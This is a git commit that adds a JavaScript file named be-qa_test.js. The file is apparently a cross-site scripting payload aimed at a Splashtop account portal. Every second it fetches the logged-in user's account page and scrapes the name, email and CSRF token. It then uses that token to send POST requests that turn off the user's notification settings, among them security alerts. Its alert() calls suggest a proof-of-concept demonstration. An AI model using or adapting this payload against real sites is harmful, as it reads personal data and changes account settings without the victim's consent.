2bae5085b0b39ddc7e0b68406db27cc22c699f2d
Aster-Lin <152589565+Aster-Lin@users.noreply.github.com>
2024-11-20 15:31:44 +0800

    Create be-qa_test.js

---
+++ be-qa_test.js
@@ -0,0 +1,22 @@
+setInterval(function(){
+    try {
+    fetch('https://my.aws-rd.splashtop.com/account_info/').then(d => d.text()).then(d => {
+    let name = (new RegExp('<h5 class="display-name" title="([^"]+)">').exec(d)[1])
+    let email = (new RegExp('<p class="email" title="([^"]+)"').exec(d)[1])
+    alert(`Your name is '${name}' and email is ${email}`)
+  
+    let csrf = (new RegExp('<meta name="csrf-token" content="([^"]+)"').exec(d)[1])
+    Array.from(['news', 'announcement', 'promotion', 'security_alerts']).map(xx => {
+      alert(`Toggled off setting: ${xx}`)
+      fetch('https://my.aws-rd.splashtop.com/ajax/messages/update_kind', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Csrf-Token': csrf
+        },
+        body: `kind=${xx}&flag=0`,
+      })
+    })
+  })
+  } catch(e){}
+  }, 1000)
